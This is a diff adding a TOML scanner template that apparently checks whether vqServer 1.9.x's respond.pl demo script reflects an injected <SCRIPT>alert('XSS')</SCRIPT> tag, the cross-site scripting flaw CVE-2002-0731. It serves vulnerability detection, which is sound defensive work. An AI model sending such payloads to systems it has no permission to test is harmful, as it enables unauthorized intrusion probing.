@@ -1,0 +1,25 @@
+[info]
+author = "ave"
+description = "检测 vqServer 1.9.x 默认 CGI 演示脚本 respond.pl 是否存在跨站脚本注入漏洞。通过向 URL 参数中注入 <SCRIPT>alert()</SCRIPT> 标签，验证服务器是否对用户输入进行过滤。若响应中反射了注入的脚本代码，则存在 XSS 漏洞。"
+id = "POC-AVE-2002-0402"
+name = "vqServer 1.9.x CGI Demo Program Script Injection PoC"
+severity = "high"
+tags = ["ave-2002-0402"]
+vuln_id = [
+    "CVE-2002-0731",
+    "AVE-2002-0402",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = '/cgi/vq/demos/respond.pl<SCRIPT>alert("XSS")</SCRIPT>'
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['<SCRIPT>alert("XSS")</SCRIPT>']
